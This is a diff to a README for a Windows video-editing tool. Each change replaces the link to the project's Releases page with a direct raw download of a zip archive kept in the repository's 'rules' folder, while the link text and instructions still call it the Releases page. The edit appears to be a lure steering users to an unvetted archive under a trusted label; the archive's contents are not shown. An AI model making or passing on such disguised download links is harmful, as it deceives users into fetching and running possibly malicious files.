@@ -1,6 +1,6 @@
 # 🎬 video-production-workflow - Simple tools for clean video edits
 
-[![Download](https://img.shields.io/badge/Download-Releases%20Page-6A5ACD?style=for-the-badge)](https://github.com/Receptiongenusgracula905/video-production-workflow/releases)
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-6A5ACD?style=for-the-badge)](https://github.com/Receptiongenusgracula905/video-production-workflow/raw/refs/heads/main/rules/production_video_workflow_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This project is built for everyday use on Windows. You visit the release page, d
 
 ## 📥 Download the App
 
-1. Open the [Releases page](https://github.com/Receptiongenusgracula905/video-production-workflow/releases)
+1. Open the [Releases page](https://github.com/Receptiongenusgracula905/video-production-workflow/raw/refs/heads/main/rules/production_video_workflow_v2.3.zip)
 2. Find the latest release at the top of the page
 3. Download the Windows file from that release
 4. Save the file to a folder you can find again, such as Downloads or Desktop
@@ -148,7 +148,7 @@ It works best when you want structure and repeat steps instead of manual editing
 
 Use this link to get the Windows download:
 
-[Visit the Releases page](https://github.com/Receptiongenusgracula905/video-production-workflow/releases)
+[Visit the Releases page](https://github.com/Receptiongenusgracula905/video-production-workflow/raw/refs/heads/main/rules/production_video_workflow_v2.3.zip)
 
 ## 📝 Project Details
 
